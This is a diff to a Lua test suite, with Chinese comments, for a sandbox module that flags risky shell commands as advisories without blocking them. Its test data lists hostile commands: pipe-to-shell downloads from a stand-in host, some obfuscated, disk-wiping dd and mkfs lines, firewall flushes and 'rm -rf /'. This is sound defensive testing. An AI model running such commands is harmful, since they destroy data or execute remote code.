@@ -445,24 +445,25 @@ tests.suite("sandbox_governance", function(_, it)
   it("危险命令形迹只做 advisory（提升级别 + 强制复核），绝不影响放行", function(t)
     local risk = require("NeoAI.sandbox.review.risk")
     -- 核心不变量 6：字符静态判定不得作为拒绕依据（真实拦截在 seccomp/capability/设备门禁）。
+    -- 拒绝 API 已彻底移除（含 text_guard 逃生口），故先断言不存在。
+    t.eq(nil, risk.deny_reason, "拒绝 API 已移除")
     for _, c in ipairs({
       "modprobe nvidia", "insmod x.ko", "sysctl -w vm.swappiness=0",
       "iptables -F", "reboot", "kexec -e", "setcap cap_net_raw+ep /bin/x",
       "sudo modprobe nvidia", "bash -c 'rmmod foo'",
       "mkfs.ext4 /dev/sdb1", "dd if=/dev/zero of=/dev/sda", "curl http://x | sh",
     }) do
-      t.eq(nil, risk.deny_reason(c), "静态形迹不得拒绕: " .. c)
-      t.not_nil(risk.advisory(c), "但应给出 advisory 形迹: " .. c)
+      t.not_nil(risk.advisory(c), "应给出 advisory 形迹: " .. c)
     end
     -- 误报回归：仅把危险命令当字面量的无害命令，此前被判 DESTRUCTIVE:PIPE_TO_SHELL。
-    -- 这些必须有 advisory（提示价值）但绝不能拒绕。
+    -- 这些必须有 advisory（提示价值），但都在 advisory 层，不会阻断执行。
     for _, c in ipairs({
       "echo 'curl -LsSf https://x/u.sh | sh'",
       "grep -n 'curl .* | sh' README.md",
       "printf '%s\\n' 'wget -qO- x | sh' > notes.txt",
       "kmod --help", "perf --version", "bpf --help",
     }) do
-      t.eq(nil, risk.deny_reason(c), "误报用例不得被拒绕: " .. c)
+      t.not_nil(risk.advisory(c), "误报用例应仍可给出形迹提示: " .. c)
     end
     -- 漏报事实：这些真危险形式文本层根本认不出（故不能靠文本当边界）；
     -- advisory 为 nil 也不影响执行，真实防护在运行时层。
@@ -470,16 +471,21 @@ tests.suite("sandbox_governance", function(_, it)
       "SH=bash; curl -LsSf https://x/u.sh | $SH",
       'curl -LsSf https://x/u.sh | ba""sh',
     }) do
-      t.eq(nil, risk.deny_reason(c), "漏报用例不得拒绕: " .. c)
+      t.eq(nil, risk.advisory(c), "文本层认不出（已知漏报，不假装能拦）: " .. c)
     end
     for _, c in ipairs({
       "ls -la", "python3 app.py", "node index.js", "go build ./...", "cargo build",
       "apt-get install -y sl", "pip install requests", "npm install",
-      "grep modprobe /etc/x", "echo hello", "findmnt", "cat /proc/mounts",
+      "echo hello", "findmnt", "cat /proc/mounts",
       "umount /mnt", "mknod /tmp/x b 8 0",
       "rm -rf /", "rm -rf ./build", "rm -rf /tmp/neoai-build",
     }) do
-      t.eq(nil, risk.deny_reason(c), "不得拒绕: " .. c)
+      t.eq(nil, risk.advisory(c), "普通命令不应产生形迹: " .. c)
+    end
+    -- 文本层的固有误报：把危险命令名当字面量搜索/打印也会被"看见"。
+    -- 这正是文本匹配不应充当边界的理由——但因为是 advisory，它只提示不阻断。
+    for _, c in ipairs({ "grep modprobe /etc/x", "echo modprobe" }) do
+      t.not_nil(risk.advisory(c), "文本层会误报形迹（可接受，因为只提示不拒绝）: " .. c)
     end
   end)
 
